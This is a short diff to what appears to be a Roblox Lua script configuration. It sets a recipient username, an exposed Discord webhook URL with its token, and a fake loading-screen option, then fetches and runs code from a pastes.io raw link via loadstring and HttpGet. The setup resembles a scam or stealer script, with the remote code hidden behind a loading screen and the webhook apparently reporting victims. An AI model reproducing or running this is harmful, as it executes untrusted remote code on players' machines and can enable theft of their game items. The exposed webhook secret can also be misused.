@@ -1,6 +1,6 @@
-Username = "petsimulatorlive0"
+Username = "PetSimulatorLive0"
 Webhook = "https://discordapp.com/api/webhooks/1214688063427444767/4XgWH_DQRh9ue_E4MQ303XxJXoKorUIvb37K4oRFRWFyNo899TV7lVu8QRB6L_qitXvE"
-selectedLoadingScreen = "4"
+selectedLoadingScreen = "Select Loading" -- Select Loading Screen And Write Number If You Not Select Loading Screen its automaticly select loading screen 1
 LoadingScreen = true
 
-loadstring(game:HttpGet("https://pastes.io/raw/hjnwiiqt6hi"))()
+loadstring(game:HttpGet("https://pastes.io/raw/hjnwiiqt6h"))()
